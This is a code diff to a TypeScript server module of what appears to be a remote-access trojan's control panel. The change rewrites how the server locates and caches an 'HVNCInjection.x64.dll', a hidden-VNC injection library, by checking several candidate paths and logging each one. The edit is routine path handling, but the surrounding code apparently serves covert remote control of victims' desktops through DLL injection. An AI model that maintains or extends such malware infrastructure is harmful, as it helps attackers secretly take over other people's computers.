@@ -7,6 +7,7 @@ import * as clientManager from "../clientManager";
 import { logger } from "../logger";
 import { metrics } from "../metrics";
 import { encodeMessage } from "../protocol";
+import { resolveRuntimeRoot } from "./runtime-paths";
 import * as sessionManager from "../sessions/sessionManager";
 import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
 import type { ClientInfo } from "../types";
@@ -18,13 +19,22 @@ let _dllCacheChecked = false;
 function getInjectionDllBytes(): Uint8Array | null {
   if (_dllCacheChecked) return _cachedInjectionDll;
   _dllCacheChecked = true;
-  const dllPath = path.resolve(import.meta.dir, "../../dist-clients/HVNCInjection.x64.dll");
-  if (existsSync(dllPath)) {
+
+  const runtimeRoot = resolveRuntimeRoot();
+  const candidates = [
+    path.resolve(runtimeRoot, "dist-clients", "HVNCInjection.x64.dll"),
+    path.resolve(process.cwd(), "dist-clients", "HVNCInjection.x64.dll"),
+    path.resolve(import.meta.dir, "../../dist-clients/HVNCInjection.x64.dll"),
+  ];
+
+  for (const dllPath of candidates) {
+    if (!existsSync(dllPath)) continue;
     _cachedInjectionDll = new Uint8Array(readFileSync(dllPath));
     logger.info(`[hvnc] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
-  } else {
-    logger.warn(`[hvnc] injection DLL not found at ${dllPath}`);
+    return _cachedInjectionDll;
   }
+
+  logger.warn(`[hvnc] injection DLL not found. Checked: ${candidates.join(", ")}`);
   return _cachedInjectionDll;
 }
 
